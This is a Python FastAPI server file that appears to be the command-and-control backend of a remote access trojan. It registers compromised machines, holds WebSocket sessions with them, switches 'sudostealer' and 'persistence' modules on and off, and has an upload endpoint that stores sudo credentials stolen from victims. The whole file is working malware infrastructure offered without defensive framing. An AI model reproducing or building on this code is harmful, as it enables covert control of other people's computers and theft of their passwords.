from fastapi import WebSocket, APIRouter, Request, WebSocketDisconnect

import machines
import con
from uid import Uid, gen_uid

rat_router = APIRouter()

@rat_router.get("/api/{version}/register")
async def register_machine(version: int, request: Request) -> Uid:
	id = gen_uid()
	machines.all[id] = machines.Machine(id=id, version=version)
	await machines.all[id].on_register(request.client.host)
	print("Registered: ", id)
	return id

@rat_router.websocket("/ws/{version}/{machine_id}")
async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine_id: Uid):
	await websocket.accept()
	try:
		print(f"Machine {machine_id} connected")
		con.active_machines[machine_id] = websocket
		await machines.all[machine_id].on_connect(websocket.client.host)
		while True:
			data = await websocket.receive_json()
			match data["event"]:
				case "log":
					await con.broadcast_log(machine_id, data["data"] if "data" in data else None, data["tags"] if "tags" in data else None)
				case "module_enabled":
					if data["name"] == "sudostealer":
						machines.all[machine_id].sudostealer.enabled = True
					elif data["name"] == "persistence":
						machines.all[machine_id].persistence.enabled = True
					await con.broadcast_machine_update(machines.all[machine_id])
				case "module_disabled":
					if data["name"] == "sudostealer":
						machines.all[machine_id].sudostealer.enabled = False
					elif data["name"] == "persistence":
						machines.all[machine_id].persistence.enabled = False
					await con.broadcast_machine_update(machines.all[machine_id])
				case "specs":
					machines.all[machine_id].update_specs(data["data"])
					await con.broadcast_machine_update(machines.all[machine_id])

	except WebSocketDisconnect:
		print(f"Machine {machine_id} left")
	finally:
		await machines.all[machine_id].on_disconnect(websocket.client.host)

@rat_router.post("/api/{version}/{machine_id}/sudostealer/upload")
async def upload_credentials(version: int, machine_id: Uid, request: Request) -> None:
	text = (await request.body()).decode()
	machines.all[machine_id].sudostealer.credentials.append(text)